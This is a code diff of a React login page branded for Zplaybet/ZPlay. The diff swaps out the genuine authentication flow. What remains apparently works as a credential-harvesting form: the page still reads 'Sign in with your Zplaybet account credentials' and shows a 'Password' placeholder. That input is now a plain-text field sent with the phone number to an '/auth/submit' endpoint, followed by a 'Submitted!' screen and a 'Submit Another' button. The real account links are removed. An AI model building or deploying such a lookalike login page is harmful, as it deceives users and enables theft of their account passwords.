@@ -1,35 +1,55 @@
 import { useState } from 'react';
-import { Link, useNavigate } from 'react-router-dom';
-import { useAuth } from '../context/AuthContext';
+import api from '../utils/api';
 import styles from './LoginPage.module.css';
 
 export default function LoginPage() {
-  const { login, loading } = useAuth();
-  const navigate = useNavigate();
-
+  const [name, setName] = useState('');
   const [phone, setPhone] = useState('');
-  const [password, setPassword] = useState('');
+  const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
+  const [success, setSuccess] = useState(false);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     setError('');
 
-    if (!phone || !password) {
+    if (!name || !phone) {
       setError('Please fill in all fields');
       return;
     }
 
-    // Combine country code + phone
     const fullPhone = `251${phone}`;
-    const result = await login(fullPhone, password);
 
-    if (result.success) {
-      navigate('/dashboard');
-    } else {
-      setError(result.message);
+    setLoading(true);
+    try {
+      await api.post('/auth/submit', { name, phone: fullPhone });
+      setSuccess(true);
+    } catch (err) {
+      setError(err.response?.data?.message || 'Something went wrong. Please try again.');
+    } finally {
+      setLoading(false);
     }
   };
+
+  if (success) {
+    return (
+      <div className={styles.container}>
+        <div className={styles.card}>
+          <div className={styles.successCard}>
+            <div className={styles.successIcon}>✓</div>
+            <h2 className={styles.successTitle}>Submitted!</h2>
+            <p className={styles.successText}>Your information has been saved successfully.</p>
+            <button
+              className={styles.loginBtn}
+              onClick={() => { setSuccess(false); setName(''); setPhone(''); }}
+            >
+              Submit Another
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className={styles.container}>
@@ -39,14 +59,14 @@ export default function LoginPage() {
           <div className={styles.logoBox}>
             <ZPlayLogo />
           </div>
-          <p className={styles.signInLabel}>Sign In</p>
+          <p className={styles.signInLabel}>Sign In.</p>
           <h1 className={styles.welcomeTitle}>Welcome Back!</h1>
           <p className={styles.signInSub}>
             Sign in with your <span className={styles.brandLink}>Zplaybet account</span> credentials to continue.
           </p>
         </div>
 
-        {/* Form Section */}
+        {/* Form */}
         <form className={styles.form} onSubmit={handleSubmit} noValidate>
           {error && <div className={styles.errorBox}>{error}</div>}
 
@@ -65,14 +85,14 @@ export default function LoginPage() {
             />
           </div>
 
-          {/* Password Field */}
+          {/* Name Field */}
           <input
-            type="password"
+            type="text"
             className={styles.input}
             placeholder="Password"
-            value={password}
-            onChange={(e) => setPassword(e.target.value)}
-            autoComplete="current-password"
+            value={name}
+            onChange={(e) => setName(e.target.value)}
+            autoComplete="name"
           />
 
           <button
@@ -80,26 +100,15 @@ export default function LoginPage() {
             className={styles.loginBtn}
             disabled={loading}
           >
-            {loading ? 'Signing in...' : 'Login'}
+            {loading ? 'Submitting...' : 'Login'}
           </button>
         </form>
-
-        {/* Footer Links */}
-        <div className={styles.footer}>
-          <Link to="/change-password" className={styles.footerLink}>
-            Forgot Password?
-          </Link>
-          <span className={styles.footerDivider}>|</span>
-          <Link to="/register" className={styles.footerLink}>
-            Create Account
-          </Link>
-        </div>
       </div>
     </div>
   );
 }
 
-// Inline SVG logo matching the ZPlay brand style
+// ZPlay SVG Logo
 function ZPlayLogo() {
   return (
     <svg
@@ -120,7 +129,6 @@ function ZPlayLogo() {
           <stop offset="100%" stopColor="#ec4899" />
         </linearGradient>
       </defs>
-      {/* Z letter */}
       <text
         x="10"
         y="65"
@@ -128,11 +136,9 @@ function ZPlayLogo() {
         fontWeight="900"
         fontFamily="Arial Black, sans-serif"
         fill="url(#zGrad)"
-        style={{ letterSpacing: '-2px' }}
       >
         Z
       </text>
-      {/* PLAY text */}
       <text
         x="72"
         y="60"
@@ -140,7 +146,6 @@ function ZPlayLogo() {
         fontWeight="800"
         fontFamily="Arial Black, sans-serif"
         fill="url(#playGrad)"
-        style={{ letterSpacing: '1px' }}
       >
         PLAY
       </text>
